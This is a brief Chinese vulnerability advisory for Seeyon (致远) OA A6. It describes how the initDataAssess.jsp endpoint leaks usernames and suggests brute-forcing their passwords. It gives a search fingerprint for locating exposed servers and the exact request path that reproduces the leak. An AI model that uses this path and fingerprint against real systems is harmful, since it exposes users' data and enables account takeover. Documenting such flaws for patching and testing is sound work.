# 致远OA A6 initDataAssess.jsp 用户敏感信息泄露

## 漏洞描述

致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露

可以通过得到的用户名爆破用户密码进入后台进一步攻击

## 漏洞影响

<a-checkbox checked>致远OA A6</a-checkbox></br>

## 网络测绘 

<a-checkbox checked>title="致远A8+协同管理软件.A6"</a-checkbox></br>

## 漏洞复现

访问下列URL泄露用户信息

```plain
http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp
```